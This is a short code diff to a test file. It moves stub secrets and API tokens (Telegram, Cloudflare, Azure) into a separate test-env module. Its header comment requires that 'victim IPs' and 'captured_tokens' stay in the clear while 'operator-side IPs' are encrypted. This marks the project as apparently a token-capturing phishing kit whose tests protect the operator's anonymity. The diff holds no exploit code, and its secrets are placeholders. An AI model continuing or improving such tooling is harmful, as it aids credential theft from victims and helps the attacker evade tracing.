@@ -1,3 +1,4 @@
+require('./test-env');
 // Victim IPs (visitors, captured_tokens) must be stored and queried in the
 // clear; operator-side IPs must stay sealed. Run via npm test.
 
@@ -5,14 +6,6 @@
 // of them here (they are stubs only; no DB or network is touched).
 // Keys must be 64 lowercase hex chars or sensitive.resolveKeys() rejects them,
 // which silently leaves ENABLED=false and every seal becomes a no-op.
-process.env.SESSION_SECRET = process.env.SESSION_SECRET || 'a'.repeat(48);
-process.env.JWT_SECRET = process.env.JWT_SECRET || 'b'.repeat(64);
-process.env.ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || 'c'.repeat(64);
-process.env.ADMIN_SETUP_KEY = process.env.ADMIN_SETUP_KEY || 'd'.repeat(16);
-process.env.TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '123:test';
-process.env.CF_API_TOKEN = process.env.CF_API_TOKEN || 'e'.repeat(20);
-process.env.AZURE_CLIENT_ID = process.env.AZURE_CLIENT_ID || 'f'.repeat(36);
-process.env.NODE_ENV = process.env.NODE_ENV || 'test';
 
 const assert = require('assert');
 
